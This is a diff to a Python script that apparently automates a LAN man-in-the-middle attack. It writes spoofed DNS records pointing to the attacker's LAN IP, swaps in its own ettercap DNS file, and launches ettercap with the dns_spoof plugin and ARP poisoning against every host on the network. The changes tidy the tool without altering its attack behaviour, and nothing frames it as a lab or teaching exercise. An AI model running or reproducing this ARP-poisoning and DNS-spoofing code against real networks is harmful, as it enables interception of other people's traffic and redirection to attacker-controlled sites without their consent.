@@ -15,6 +15,14 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 
+def ettercappath():
+    FNULL = open(os.devnull, 'w')
+    try:
+        subprocess.call(["ettercap"], stdout=FNULL, stderr=subprocess.STDOUT)
+    except OSError:
+        from src.config import etterdir
+
+
 def spoofstart():
     # Verify System and clean up afterlast usage
     if os.path.isfile('src/etter.dns'):
@@ -60,11 +68,12 @@ def spoofstart():
         f.write(' A ')
         f.writelines(lanip+'\n')
 
-    print("Backing up ettercap config and creating our own")
+    print("Remember to uncheck redir_command_on/off in etter.conf")
+    print('Default location /etc/ettercap/etter.conf')
 
     # Ettercap Config (etter.dns)
-    subprocess.call(['mv', '/etc/ettercap/etter.conf', '/etc/ettercap/etter.conf.bak'])
-    subprocess.call(['cp', 'src/etter.conf', '/etc/ettercap/etter.conf'])
+    #subprocess.call(['mv', '/etc/ettercap/etter.conf', '/etc/ettercap/etter.conf.bak'])
+    #subprocess.call(['cp', 'src/etter.conf', '/etc/ettercap/etter.conf'])
 
     # Ettercap DNS config (etter.dns)
     subprocess.call(['mv', '/etc/ettercap/etter.dns', '/etc/ettercap/etter.dns.bak'])
@@ -97,15 +106,12 @@ def spoofstart():
 
     if os.path.isfile('src/config.py'):
         from src.config import etterdir
-        subprocess.call([etterdir, '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])
+        subprocess.call([etterdir, '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///'])
     else:
-        subprocess.call(['ettercap', '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])
+        subprocess.call(['ettercap', '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///'])
 
 
 try:
     spoofstart()
-    os.system('kalel')
 except KeyboardInterrupt:
     print("\n\nDon't forget your cat!\n")
-finally:
-    os.system('kalel')
